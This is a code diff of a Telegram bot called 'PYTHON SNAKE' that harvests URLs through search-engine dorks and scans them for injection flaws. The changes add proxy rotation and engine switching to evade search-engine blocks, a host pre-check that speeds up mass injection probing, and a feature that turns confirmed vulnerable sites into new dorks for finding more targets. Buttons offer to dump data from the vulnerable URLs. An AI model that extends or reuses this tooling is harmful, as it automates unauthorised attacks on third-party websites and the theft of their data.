@@ -70,7 +70,7 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.11.0"
+VERSION = "v2.12.0"
 BUILD = "parser-parallel+inj-fast+rev-vuln"   # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
@@ -136,16 +136,12 @@ EMOJI_OK = [True]          # Telegram reject kare to khud OFF ho jata hai
 
 
 def emo(slot, fallback=""):
-    """Message text ke liye emoji — premium id set ho to ANIMATED ban jata hai.
+    """Message text ke liye emoji — sirf NORMAL emoji.
 
-    <tg-emoji emoji-id="123">🔑</tg-emoji> — Telegram premium users ko
-    animation dikhti hai, baaki ko normal emoji.
+    Premium (animated) emoji deliberately OFF hai: har Telegram client me
+    reliable nahi hota aur buttons me kaam nahi karta. Simple > fancy.
     """
-    base = fallback or EMOJI.get(slot, "")
-    cid = str(PREMIUM_EMOJI.get(slot) or "").strip()
-    if cid and EMOJI_OK[0] and base:
-        return '<tg-emoji emoji-id="%s">%s</tg-emoji>' % (cid, base)
-    return base
+    return fallback or EMOJI.get(slot, "")
 
 
 def emo_btn(slot, fallback=""):
@@ -2778,7 +2774,56 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
     st = {"urls": len(urls), "urls_done": 0, "tested": 0, "total": 0,
           "vulns": [], "blocked": 0, "errors": 0, "start": time.time(),
           "cat": cat, "stopped": 0, "suspected": 0, "skipped": 0,
-          "dead_hosts": [], "proxy": {}, "workers": 0}
+          "dead_hosts": [], "proxy": {}, "workers": 0,
+          "hosts": 0, "hosts_live": 0, "hosts_dead": 0, "precheck": 0.0,
+          "req_ok": 0, "req_fail": 0, "stage": "precheck"}
+
+    # ── PRE-CHECK: har host ek baar ping (dead host = 8 probes × timeout waste) ──
+    _pre_t = time.time()
+    if len(urls) >= 40:
+        _by_host = {}
+        for _u in urls:
+            _by_host.setdefault(urlparse(_u).hostname or "", []).append(_u)
+        st["hosts"] = len(_by_host)
+        _dead = set()
+        if len(_by_host) >= 3:
+            _pc = mk_connector(limit=64, force_close=True)
+
+            async def _ping_host(_h, _sample):
+                if not _h:
+                    return
+                try:
+                    async with aiohttp.ClientSession(connector=_pc) as _s0:
+                        async with _s0.get(
+                                _sample, headers=dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
+                                timeout=aiohttp.ClientTimeout(total=min(5.0, max(3.0, float(timeout)))),
+                                ssl=False, allow_redirects=False) as _r0:
+                            _ = _r0.status            # koi bhi status = host zinda
+                except Exception:
+                    _dead.add(_h)
+
+            _sem_pre = asyncio.Semaphore(48)
+
+            async def _ping_wrap(_h, _sample):
+                async with _sem_pre:
+                    await _ping_host(_h, _sample)
+
+            try:
+                await asyncio.gather(*[_ping_wrap(h, v[0]) for h, v in
+                                       list(_by_host.items())[:3000]])
+            except Exception:
+                pass
+            if _dead:
+                urls = [u for u in urls if (urlparse(u).hostname or "") not in _dead]
+                st["dead_hosts"] = sorted(_dead)[:200]
+        st["hosts_dead"] = len(_dead)
+        st["hosts_live"] = max(0, st["hosts"] - len(_dead))
+        st["urls"] = len(urls)
+    st["precheck"] = round(time.time() - _pre_t, 1)
+    st["stage"] = "scan"
+    if not urls:
+        st["took"] = time.time() - st["start"]
+        return st
 
     tasks = []                      # (raw, url, family, payload, param)
     pending = {}
@@ -2880,6 +2925,8 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                     px_stat["ok"] += 1
                     if rot.enabled:
                         rot.ok(px)
+                async with lock:
+                    st["req_ok"] += 1
             except Exception:
                 if px:
                     px_stat["fail"] += 1
@@ -2893,6 +2940,7 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                 async with lock:
                     st["tested"] += 1
                     st["errors"] += 1
+                    st["req_fail"] += 1
                     host_fail[host] += 1
                     if host_fail[host] >= 4 and host not in dead_hosts:
                         dead_hosts.add(host)
@@ -3558,6 +3606,38 @@ def proxy_available() -> bool:
     return bool(PROXIES or load_proxy_pool() or rot_proxies())
 
 
+_PROXY_BOOT = {"at": 0.0, "running": False}
+
+
+async def ensure_proxy_pool(max_wait: float = 45.0, want: int = 40) -> list:
+    """Pool khaali ho to khud scrape + check karo (max_wait andar).
+
+    Parser pe "proxy on hai par pool khaali" wali confusion khatam.
+    """
+    pool = load_proxy_pool()
+    if len(pool) >= 5:
+        return pool
+    if _PROXY_BOOT["running"] or (time.time() - _PROXY_BOOT["at"] < 600):
+        return pool
+    _PROXY_BOOT["running"] = True
+    try:
+        raw = await asyncio.wait_for(scrape_proxies(force=True), timeout=max_wait)
+        if not raw:
+            return pool
+        good = await asyncio.wait_for(
+            check_proxies(raw, concurrency=300, timeout=5.0, want=want),
+            timeout=max(10.0, max_wait))
+        if good:
+            save_proxy_pool(good)
+            logger.info("proxy bootstrap: %d alive", len(good))
+    except Exception as exc:
+        logger.info("proxy bootstrap skip: %s", str(exc)[:80])
+    finally:
+        _PROXY_BOOT["running"] = False
+        _PROXY_BOOT["at"] = time.time()
+    return load_proxy_pool()
+
+
 def save_proxy_pool(good: list) -> None:
     global PROXIES
     PROXIES = _merge_rot(good)
@@ -3605,6 +3685,9 @@ JUNK_EXT = {".css", ".js", ".woff", ".woff2", ".ttf", ".eot", ".ico", ".svg", ".
 
 # 9 engines — bing & mojeek bina proxy bhi chalte hain (v2.11)
 ENGINE_URLS = {
+    # Bing RSS — sabse reliable: koi JS/captcha nahi, clean XML. Ye kabhi nahi
+    # block hota, isliye har mode me hai (yahi "sirf bing" ka ilaaj hai).
+    "bingr":  "https://www.bing.com/search?q={q}&format=rss&first={p}&count=30",
     "ddgl":   "https://lite.duckduckgo.com/lite/?q={q}&s={p}",
     "ddg":    "https://html.duckduckgo.com/html/?q={q}&s={p}",
     "bing":   "https://www.bing.com/search?q={q}&first={p}&count=30&setlang=en",
@@ -3614,7 +3697,20 @@ ENGINE_URLS = {
     "brave":  "https://search.brave.com/search?q={q}&offset={p}&source=web",
     "yandex": "https://yandex.com/search/?text={q}&p={p}&lr=0",
     "yahoo":  "https://search.yahoo.com/search?p={q}&b={p}&n=30",
+    "startpage": "https://www.startpage.com/sp/search?query={q}&page={p}",
+    "qwant":  "https://www.qwant.com/?q={q}&t=web",
+    "ecosia": "https://www.ecosia.org/search?q={q}&p={p}",
+    "sxng":   "https://searx.be/search?q={q}&pageno={p}",
 }
+
+# SearXNG public instances — ye Google/Bing/DDG ka result ek jagah dete hain aur
+# HTML scrape karna allowed hai. Ek down ho to agla try hota hai.
+SXNG_INSTANCES = [
+    "https://searx.be", "https://search.inetol.net", "https://baresearch.org",
+    "https://priv.au", "https://searx.tiekoetter.com", "https://opnxng.com",
+    "https://search.rhscz.eu", "https://searxng.site", "https://search.bus-hit.me",
+]
+ENGINE_MULTI = {"sxng": SXNG_INSTANCES}
 
 # (start, step) — har engine ka pagination offset
 ENGINE_PAGE = {
@@ -3632,8 +3728,9 @@ ENGINE_POST = {
     "ddgl": "https://lite.duckduckgo.com/lite/",
 }
 
-ENGINE_ORDER = ["bing", "mojeek", "ddgl", "ddg", "yahoo", "brave", "google",
-                "yandex", "marginalia"]
+ENGINE_ORDER = ["bing", "bingr", "mojeek", "ddgl", "ddg", "yahoo", "sxng",
+                "startpage", "brave", "google", "qwant", "ecosia", "yandex",
+                "marginalia"]
 
 # Challenge / captcha page — ye "0 results" nahi, BLOCK hai
 BLOCK_MARKS = ("anomaly-modal", "anomaly_modal", "unusual traffic", "are you a robot",
@@ -3643,22 +3740,44 @@ BLOCK_MARKS = ("anomaly-modal", "anomaly_modal", "unusual traffic", "are you a r
 
 # ── Kitne engines? Termux/phone pe kam = fast. Ye 3 bina proxy bhi chalte hain ──
 ENGINE_SETS = {
-    # fast = bina proxy bhi chalta hai (kam = slow net pe bhi jaldi)
-    "fast":   ["bing", "mojeek", "ddgl"],
-    # normal = 5 engines — bing + mojeek bina proxy bhi chalte hain
-    "normal": ["bing", "mojeek", "ddgl", "ddg", "yahoo"],
-    # max = 8 (google/yandex ke liye proxy zaroori)
-    "max":    ["bing", "mojeek", "ddgl", "ddg", "yahoo", "brave",
-               "google", "yandex", "marginalia"],
+    # fast — bina proxy bhi chalte hain (bing + bingr RSS + mojeek)
+    "fast":   ["bing", "bingr", "mojeek"],
+    # normal — 6 engines, 3 bina proxy chalne wale
+    "normal": ["bing", "bingr", "mojeek", "ddgl", "ddg", "sxng", "yahoo"],
+    # max — sab kuch, proxy ho to google/yandex bhi
+    "max":    ["bing", "bingr", "mojeek", "ddgl", "ddg", "sxng", "yahoo",
+               "startpage", "brave", "qwant", "ecosia", "google", "yandex",
+               "marginalia"],
 }
-ENGINE_LABEL = {"fast": "⚡ FAST — 3 engines (no proxy)",
-                "normal": "⚖️ NORMAL — 5 engines (bing+mojeek always)",
-                "max": "🐢 MAX — 9 engines (proxy needed)"}
+ENGINE_LABEL = {"fast": "⚡ FAST — 3 engines (no proxy needed)",
+                "normal": "⚖️ NORMAL — 7 engines (bing RSS + mojeek + searx)",
+                "max": "🐢 MAX — 14 engines (proxy se google/yandex bhi)"}
 ENGINE_TIMEOUT = {"fast": 6.0, "normal": 8.0, "max": 10.0}
 ENGINE_DEAD_AFTER = 3          # 3 miss → is run me skip (global state nahi)
 
 # Bina proxy ye engines pakka block karte hain → try bhi mat karo (time bachao)
 NO_PROXY_DEAD = {"google", "yandex"}      # bina proxy ye 2 pakka block
+
+# Free proxy pe ye engines aur zyada block karte hain (IP reputation + captcha).
+# AUTO mode me inhe DIRECT chalao, warna "proxy ON par bhi sab ❌" hi milta hai.
+PROXY_HURTS = {"bingr", "mojeek", "ddgl", "ddg", "marginalia", "qwant", "ecosia"}
+# Inhe proxy se fayda hota hai (IP block karte hain)
+PROXY_NEEDS = {"google", "yandex", "brave", "startpage"}
+
+
+def parse_engine_proxy(engine: str, mode: str = "auto") -> bool:
+    """Is engine ko proxy se chalana chahiye?
+
+    auto  → jo proxy se ulta block hote hain unhe DIRECT, baaki ko proxy
+    off   → sab direct
+    on    → sab proxy (user ka mann)
+    """
+    m = str(mode or "auto").lower()
+    if m in ("off", "0", "no", "direct"):
+        return False
+    if m in ("on", "1", "yes", "proxy"):
+        return True
+    return engine in PROXY_NEEDS
 ENGINE_MISS = {}      # engine -> consecutive empty/blocked count
 ENGINE_LAST = {}      # engine -> (reason, time) — /enginetest + 0-URL card me dikhta hai
 
@@ -3669,6 +3788,43 @@ def looks_blocked(body: str) -> bool:
     if not b:
         return True
     return any(m in b for m in BLOCK_MARKS)
+
+
+# Har engine ka asli "kaise chalega" — doctor isi se hint deta hai
+ENGINE_FIX = {
+    "bing":    "Direct chalta hai. Block ho to proxy ON karo.",
+    "bingr":   "RSS — kabhi block nahi hota. Ye hamesha on rakho.",
+    "mojeek":  "Independent index, bina proxy chalta hai.",
+    "ddg":     "POST form use karta hai. Block ho to proxy ON.",
+    "ddgl":    "Lite version — sabse halka, bina proxy chalta hai.",
+    "sxng":    "SearXNG public instance — Google/Bing ka result ek jagah. "
+               "Ek down ho to agla khud try hota hai.",
+    "yahoo":   "Bing ka data — usually bina proxy chalta hai.",
+    "startpage": "Google ka data, privacy proxy ke through. Block ho to proxy ON.",
+    "brave":   "Apna index. Free proxy IPs ko block karta hai.",
+    "google":  "Google proxy/datacenter IP ko PAKKA block karta hai. Free proxy se "
+               "kabhi nahi chalega — apni IP se chalao ya SERPER free key (/apikeys).",
+    "yandex":  "Proxy ke bina captcha. Free proxy pe bhi mostly block.",
+    "qwant":   "Apna index, bina proxy try karo.",
+    "ecosia":  "Bing ka data, light page.",
+    "marginalia": "Chhota index, block nahi karta.",
+}
+
+
+def engine_fix(engine: str, reason: str = "") -> str:
+    """Reason ke hisaab se seedha fix batao."""
+    r = (reason or "").lower()
+    hint = ENGINE_FIX.get(engine, "")
+    if "proxy dns" in r or "timeout" in r:
+        return "Connection nahi bana — proxy dead hai. Proxy OFF karke try karo."
+    if "http 429" in r or "rate limit" in r:
+        return "Rate limit — 2-3 min ruk ke try karo, ya proxy ON."
+    if "blocked page" in r or "captcha" in r or "http 403" in r:
+        if engine in ("google", "yandex", "brave", "startpage"):
+            return ("Ye engine free proxy pe block karta hai. Fix: proxy OFF + thodi "
+                    "der ruk ke, ya SERPER key (/apikeys).")
+        return "Aapka IP block hua — proxy ON karo ya 5 min ruko."
+    return hint or "—"
 
 
 def engine_reason(err: str) -> str:
@@ -3926,6 +4082,11 @@ def extract_urls(engine: str, body: str) -> list:
         except Exception:
             pass
         if not ok_json:
+            # HTML — searxng result links: <article class="result"> <a href=...>
+            for m in re.finditer(r'<article[^>]+class="[^"]*result[^"]*"(.*?)</article>',
+                                 body, re.S):
+                for hm in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', m.group(1)):
+                    out.append(_html.unescape(hm.group(1)))
             # HTML — searxng result links <a class="url_header" href=...> / h3 a
             for m in re.finditer(r'<a[^>]+class="[^"]*url_header[^"]*"[^>]+href="([^"]+)"', body):
                 out.append(m.group(1))
@@ -3968,6 +4129,14 @@ async def fetch_engine(session, engine: str, dork: str, proxy=None,
         target = url.format(q=quote_plus(dork), p=base + int(page) * step)
     except Exception:
         target = url.format(q=quote_plus(dork))
+    _multi = ENGINE_MULTI.get(engine)
+    if _multi:                       # instance rotate (searx) — har attempt naya
+        inst = random.choice(_multi)
+        try:
+            target = "%s/search?q=%s&pageno=%d" % (inst, quote_plus(dork),
+                                                   max(1, int(page) + 1))
+        except Exception:
+            pass
     post_url = ENGINE_POST.get(engine)
     post_data = None
     if post_url:
@@ -3982,7 +4151,9 @@ async def fetch_engine(session, engine: str, dork: str, proxy=None,
          "https://search.yahoo.com/", "https://search.brave.com/"])
     deadline = time.time() + max(3.0, float(timeout))
     last_err = ""
-    for attempt in (1, 2, 3):
+    # proxy ho to 3 try (har baar naya IP), warna 2 — phone pe time bachao
+    _tries = 3 if (rot is not None and len(rot)) else 2
+    for attempt in range(1, _tries + 1):
         px = proxy if proxy else (rot.next() if rot else None)
         kw = {"headers": dict(hdrs, **{"User-Agent": random.choice(UA_LIST)}),
               "timeout": aiohttp.ClientTimeout(
@@ -4002,7 +4173,7 @@ async def fetch_engine(session, engine: str, dork: str, proxy=None,
                     last_err = "HTTP %s" % r.status
                     if rot and px and r.status in (403, 407, 429, 502, 503):
                         rot.dead(px)                 # proxy jal gaya → agla
-                    if r.status not in (403, 407, 429, 500, 502, 503) or attempt == 3:
+                    if r.status not in (403, 407, 429, 500, 502, 503) or attempt == _tries:
                         ENGINE_LAST[engine] = (last_err, time.time())
                         engine_miss_add(engine, miss)
                         return []
@@ -4017,14 +4188,14 @@ async def fetch_engine(session, engine: str, dork: str, proxy=None,
                     last_err = "blocked page (captcha/challenge)"
                     if rot and px:
                         rot.dead(px)
-                    if attempt == 3:
+                    if attempt == _tries:
                         ENGINE_LAST[engine] = (last_err, time.time())
                         engine_miss_add(engine, miss)
                         return []
                     continue
                 urls = extract_urls(engine, body)
                 # 1-2 links = nav links, asli results nahi (ddg ka classic dhokha)
-                if urls and len(urls) < 3 and engine in ("ddg", "ddgl", "mojeek"):
+                if urls and len(urls) < 3 and engine in ("ddg", "ddgl", "mojeek", "sxng"):
                     last_err = "0 results (nav links only)"
                     if attempt == 3:
                         ENGINE_LAST[engine] = (last_err, time.time())
@@ -4621,7 +4792,7 @@ def parse_url_limit(ndorks: int = 0) -> int:
 def parse_budget() -> float:
     """Scan kitni der chalega (second) — time khatam to jo mila wahi de dega."""
     try:
-        return max(60.0, min(7200.0, float(sget("parse_budget", 1800) or 1800)))
+        return max(0.0, min(14400.0, float(sget("parse_budget", 3600) or 3600)))
     except Exception:
         return 1800.0
 
@@ -4639,6 +4810,7 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
     if use_proxy is None:                       # auto
         use_proxy = proxy_available()
     mode = mode if mode in ENGINE_SETS else engines_mode()
+    _px_mode0 = str(sget("parse_engine_proxy", "auto") or "auto")
     reset_engine_miss()                         # BUG 2 fix: naya scan = naya count
     rot = ProxyRotator(enabled=bool(use_proxy))
     eng_list = [e for e in engine_list(mode)
@@ -4650,9 +4822,9 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
     except Exception:
         eng_to = ENGINE_TIMEOUT.get(mode, 8.0)
     try:
-        _threads = max(1, min(10, int(sget("parse_threads", 6) or 6)))
+        _threads = max(2, min(24, int(sget("parse_threads", 12) or 12)))
     except Exception:
-        _threads = 4
+        _threads = 12
     _esem = asyncio.Semaphore(_threads)
     _dead_engines = set()
     _miss = {}                                  # per-run engine miss (BUG 8)
@@ -4662,7 +4834,7 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
           "relaxed": 0, "mode": mode, "engines": len(eng_list),
           "aborted": 0, "wb": 0, "empty_streak": 0, "time_up": 0, "stop": 0,
           "engines_used": len(eng_list), "dead": [], "proxy": rot.stats(),
-          "rounds": 0, "per_dork": 0}
+          "rounds": 0, "per_dork": 0, "px_mode": "auto"}
     _t_start = time.time()
     seen, out = set(), []
     _uid = str(ACTIVE_UID.get("uid")) if ACTIVE_UID.get("uid") else None
@@ -4741,19 +4913,27 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
         _lock = asyncio.Lock()
         _ok_count = defaultdict(int)
         _prog_at = [0.0]
-        _dork_conc = max(2, min(10, int(_threads)))
+        _dork_conc = max(2, min(24, int(_threads)))
+
+        _px_mode = str(sget("parse_engine_proxy", "auto") or "auto")
 
         async def _call_engine(eng, dork, page, deadline):
-            """Ek engine call — semaphore + hard deadline."""
+            """Ek engine call — semaphore + hard deadline.
+
+            AUTO: bingr/mojeek/ddgl/ddg jaise engines DIRECT chalte hain
+            (free proxy unhe ulta block karvata hai), google/brave/startpage
+            ko proxy milta hai. Isi se "proxy ON par bhi sirf bing" khatam.
+            """
             if eng in _dead_engines or time.time() > deadline:
                 return None
+            _use_rot = rot if parse_engine_proxy(eng, _px_mode) else None
             try:
                 async with _esem:
                     if eng in _dead_engines or time.time() > deadline:
                         return None
                     return await asyncio.wait_for(
                         fetch_engine(session, eng, dork, None, page=page,
-                                     timeout=eng_to, rot=rot, miss=_miss),
+                                     timeout=eng_to, rot=_use_rot, miss=_miss),
                         timeout=max(3.0, eng_to + 1.0))
             except Exception as exc:
                 logger.info("engine %s fail: %s", eng, str(exc)[:70])
@@ -4762,7 +4942,13 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                 return None
 
         async def _scan_dork(i, dork):
-            """Ek dork — engines best-first, 2 sources milte hi ruk jao."""
+            """Ek dork — engines best-first, 1-2 sources milte hi ruk jao.
+
+            Jab aadhe se zyada engines dead hain to 1 hit par hi ruk jate hain,
+            warna 5 blocked engines ka timeout khaate rehte (yahi 0.27 dork/s
+            wala slowdown tha).
+            """
+            _need = 1 if len(_dead_engines) >= max(2, len(eng_list) // 2) else 2
             got_any = 0
             dl = time.time() + max(6.0, eng_to * 1.25)
             added = []
@@ -4787,12 +4973,12 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                     added.append(u)
                 got_any += 1 if gurls else 0
             for page in range(pages):
-                if got_any >= 2 or time.time() > dl:
+                if got_any >= _need or time.time() > dl:
                     break
                 for eng in order:
                     if eng in _dead_engines:
                         continue
-                    if got_any >= 2 or time.time() > dl:
+                    if got_any >= _need or time.time() > dl:
                         break
                     urls = await _call_engine(eng, dork, page, dl)
                     if urls is None:
@@ -4875,6 +5061,7 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
     st["unique"] = len(out)
     st["filtered"] = max(st["filtered"], st["raw"] - st["unique"])
     st["proxy"] = rot.stats()
+    st["px_mode"] = _px_mode0
     st["per_dork"] = round(st["scanned"] / max(1, time.time() - _t_start), 2)
     return {"urls": out, "stats": st}
 
@@ -5665,12 +5852,6 @@ async def _on_callback_inner(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if data.startswith("rv:"):
         return await cb_rev_mode(update, context, data[3:])
 
-    # ── premium emoji slot pick (admin) ──
-    if data.startswith("se:set:"):
-        if not is_admin(uid):
-            return await show_home(update, uid)
-        return await cb_premium_pick(update, context, data[7:])
-
     # ── admin ──
     if data.startswith("a:"):
         return await admin_callback(update, context, data[2:])
@@ -5805,6 +5986,9 @@ async def _route_tool_cb(update, context, data: str):
             return await cb_pro_combos(update, context, "")
         if rest == "gen":
             return await cb_pro_gen(update, context)
+    elif head == "pr" and rest == "doctor":
+        return await cmd_enginetest(update, context)
+
     elif head == "pr":
         if rest == "last":
             return await cb_parse_last(update, context)
@@ -5894,6 +6078,8 @@ async def _route_tool_cb(update, context, data: str):
         if rest == "clear":
             return await cb_proxy_clear(update, context)
     elif head == "inj":
+        if rest == "uhq":
+            return await cb_inj_uhq(update, context)
         if rest == "go":
             return await cb_inj_go(update, context)
         if rest == "paste":
@@ -7656,16 +7842,28 @@ def _inj_progress_card(st: dict, spin: int) -> str:
     speed = st["tested"] / took
     left = max(0, st["total"] - st["tested"])
     eta = (left / speed) if speed > 0.05 else 0
+    _uniq_v = len({v["base"] for v in st["vulns"]}) if st.get("vulns") else 0
+    _extra = ""
+    if st.get("hosts"):
+        _extra = ("◆ Live hosts : <code>%s/%s</code>  <i>(dead skip)</i>\n"
+                  % (fmt(st.get("hosts_live", 0)), fmt(st.get("hosts", 0))))
+    _stage = st.get("stage") or "scan"
+    if _stage == "precheck":
+        return (H("SCANNING", "%s • pre-check" % CAT_LABEL.get(st.get("cat"), "ALL"))
+                + "\n\n" + bar2(pct, 14, spin) + "\n\n"
+                + "◆ Sites      : <code>%s</code>\n" % fmt(st.get("urls", 0))
+                + "◆ Step       : <i>hosts check ho rahe hain (dead skip)</i>\n"
+                + "◆ Requests   : <code>0</code>")
     return (H("SCANNING", "%s • %d probes" % (CAT_LABEL.get(st.get("cat"), "ALL"),
                                               len(inj_probes_for(st.get("cat") or "all"))))
             + "\n\n" + bar2(pct, 14, spin) + "\n\n"
-            + "◆ URLs       : <code>%s/%s</code>  <i>(kitne sites)</i>\n"
+            + "◆ Sites      : <code>%s/%s</code>  <i>(scanned)</i>\n"
               % (fmt(st["urls_done"]), fmt(st["urls"]))
             + "◆ Requests   : <code>%s/%s</code>  <i>(probe calls)</i>\n"
               % (fmt(st["tested"]), fmt(st["total"]))
-            + "◆ Vulnerable : <code>%s</code>%s\n"
-              % (fmt(len(st["vulns"])),
-                 (" (+%d need verify)" % st["suspected"]) if st.get("suspected") else "")
+            + _extra
+            + "◆ Vulnerable : <code>%s</code> site%s\n"
+              % (fmt(_uniq_v), "" if _uniq_v == 1 else "s")
             + "◆ Blocked    : <code>%s</code>\n" % fmt(st["blocked"])
             + "◆ Speed      : <code>%.1f req/s</code>\n" % speed
             + "◆ ETA        : <code>%s</code>" % (("%.0fs" % eta) if eta else "—"))
@@ -7685,6 +7883,47 @@ def _inj_vuln_lines(vulns, n: int = 6) -> str:
     if len(vulns) > n:
         out.append("<i>+ %d more in the file…</i>" % (len(vulns) - n))
     return "\n\n".join(out)
+
+
+async def cb_inj_uhq(update, context):
+    """Injector ke confirmed vulnerable URLs → UHQ dorks (bina keywords)."""
+    q = update.callback_query
+    vulns = context.user_data.get("last_vulns") or []
+    urls = _uniq([str(v.get("base") or "") for v in vulns if v.get("base")])
+    if not urls:
+        try:
+            await q.answer("Pehle INJECTOR chalao — vulnerable URLs chahiye",
+                           show_alert=True)
+        except Exception:
+            pass
+        return
+    dorks = vuln_reverse_dorks(urls, n=120)
+    if not dorks:
+        try:
+            await q.answer("In URLs me path/param nahi mila — dorks nahi bane",
+                           show_alert=True)
+        except Exception:
+            pass
+        return
+    context.user_data["last_dorks"] = dorks
+    context.user_data["uhq_from"] = len(urls)
+    body = (H("VULN → UHQ DORKS", "%d URLs → %d dorks" % (len(urls), len(dorks)),
+              slot="rev") + "\n\n"
+            + B("Vulnerable URLs used") + "\n" + short_list(urls[:5], 5) + "\n\n"
+            + B("Top UHQ dorks (bina keywords)") + "\n" + short_list(dorks[:10], 10) + "\n\n"
+            + P("Ye dorks wahi file + param + extension shape dhoondhte hain — "
+                "isi liye quality high rehti hai, niche keywords ki zarurat nahi."))
+    try:
+        await q.edit_message_text(
+            body[:3900], parse_mode=ParseMode.HTML,
+            reply_markup=RK([
+                [InlineKeyboardButton("🚀 DEEP SCAN THESE DORKS", callback_data="pr:deep")],
+                [InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")],
+            ]))
+    except Exception:
+        pass
+    path, cnt = dump_text(dorks, "uhq_from_vuln", "PYTHON SNAKE — UHQ dorks (from vuln URLs)")
+    await send_file(update, path, "🔗 %d UHQ dorks" % cnt)
 
 
 async def _run_inject(update, context, urls):
@@ -7730,8 +7969,10 @@ async def _run_inject(update, context, urls):
             + "🚫 Blocked: <code>%s</code>\n" % fmt(st["blocked"])
             + ("⚠️ Unverified: <code>%s</code> (2nd check fail — confidence low)\n"
                % fmt(st["suspected"]) if st.get("suspected") else "")
-            + ("💀 Dead hosts skipped: <code>%s</code>\n" % fmt(len(st.get("dead_hosts") or []))
-               if st.get("dead_hosts") else "")
+            + ("💀 Dead hosts skipped: <code>%s</code>\n" % fmt(st.get("hosts_dead", 0))
+               if st.get("hosts_dead") else "")
+            + ("⏱ Host pre-check: <code>%.1fs</code>\n" % st.get("precheck", 0)
+               if st.get("precheck") else "")
             + ("⛔ Stopped early\n" if st.get("stopped") else "")
             + "\n" + bar2(100, 14, None))
     if vulns:
@@ -7749,6 +7990,8 @@ async def _run_inject(update, context, urls):
     if _n_v:
         _rows.append([InlineKeyboardButton("📁 DUMP THESE %d URL(s)" % _n_v,
                                            callback_data="df:frominj")])
+        _rows.append([InlineKeyboardButton("🔗 VULN → UHQ DORKS (%d)" % _n_v,
+                                           callback_data="inj:uhq")])
     _rows.append([InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")])
     _kb_done = RK(_rows)
     for ch in chunk_lines(body)[:3]:
@@ -7796,6 +8039,8 @@ async def tool_parse(update, context):
                               callback_data="pr:limit")],
         [InlineKeyboardButton("🎛 %s" % ENGINE_LABEL[mode].split(" ", 1)[-1],
                               callback_data="pr:eng")],
+        [InlineKeyboardButton("🔬 ENGINE DOCTOR (kaun block hai + fix)",
+                              callback_data="pr:doctor")],
         [InlineKeyboardButton("⚙️ PARSER SETTINGS (pages / threads / timeout)",
                               callback_data="pr:cfg")],
         [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
@@ -7891,7 +8136,9 @@ async def cb_parse_limit(update, context):
 
 PARSER_CYCLES = {
     "pages":   ("parse_pages", [1, 2, 3, 5], "Pages per dork"),
-    "threads": ("parse_threads", [2, 3, 4, 6, 8], "Parallel dorks"),
+    "threads": ("parse_threads", [4, 6, 8, 12, 16, 20, 24], "Parallel dorks"),
+    "budget": ("parse_budget", [900, 1800, 3600, 7200, 0], "Time budget"),
+    "pxmode": ("parse_engine_proxy", ["auto", "off", "on"], "Engine proxy"),
     "timeout": ("parse_timeout", [6, 8, 12, 20], "Engine timeout (s)"),
 }
 
@@ -7989,6 +8236,8 @@ async def input_deep_max(update, context, text: str):
         _auto = True
     budget = parse_budget()
     _uid = update.effective_user.id
+    if is_admin(_uid) and str(sget("parse_auto_proxy", 1) or 1).lower() in ("1", "true", "on", "yes"):
+        await ensure_proxy_pool(max_wait=40.0)
     ACTIVE_UID["uid"] = _uid
     stop_clear(_uid)
     _tok = stop_mark(_uid)
@@ -8021,6 +8270,9 @@ async def input_deep_max(update, context, text: str):
                    % (st.get("engines", 0) - len(st.get("dead") or []), st.get("engines", 0))
                  + "◆ Proxies     : <code>%s/%s</code>\n"
                    % (pr.get("alive", 0), pr.get("pool", 0))
+                 + ("⚠️ Proxy pool khaali — engines direct IP se block ho rahe hain.\n"
+                    "<i>Admin: INJECTOR → PROXY ENGINE → RUN (ya /rotproxy)</i>\n"
+                    if not pr.get("pool") else "")
                  + "◆ Speed       : <code>%s dork/s</code>\n" % (st.get("per_dork", 0))
                  + "◆ Time left   : <code>%.0f min</code>"
                    % max(0, (budget - (time.time() - t0)) / 60)),
@@ -8058,7 +8310,7 @@ async def input_deep_max(update, context, text: str):
             "⚙️ Engines: <code>%s</code>\n"
             "🧵 Parallel dorks: <code>%s</code>\n"
             "🔎 %s\n\n"
-            "%s\n%s\n%s\n%s\n%s\n\n"
+            "%s\n%s\n%s\n%s\n%s\n%s\n\n"
             "[%s] <b>100%%</b>\n\n"
             "📦 <b>Files ready</b>"
             % (st["scanned"], st["total"], fmt(st["raw"]), fmt(st["unique"]),
@@ -8069,6 +8321,13 @@ async def input_deep_max(update, context, text: str):
                KV("Filtered", "<code>%s</code> (junk %s • mismatch %s)"
                   % (fmt(st["filtered"]), fmt(st["junk"]), fmt(st["mismatch"])), "🚫"),
                KV("Engines mode", "<b>%s</b> — change it with <code>/engines</code>" % engines_mode(), "🎛"),
+               KV("Engine proxy", "<b>%s</b> — <code>%s</code> requests via proxy, "
+                  "pool <code>%s</code> alive · fail <code>%s</code>\n<i>auto = jo proxy se "
+                  "block hote hain wo direct</i>"
+                  % (str(st.get("px_mode", "auto")).upper(),
+                     fmt((st.get("proxy") or {}).get("used", 0)),
+                     fmt((st.get("proxy") or {}).get("alive", 0)),
+                     fmt((st.get("proxy") or {}).get("fail", 0))), "🧅"),
                (KV("Stopped", "⛔ you pressed STOP — kept whatever was found", "⛔")
                 if st.get("stop") else
                 KV("Stopped", "⏱ time budget finished — kept whatever was found", "⏱")
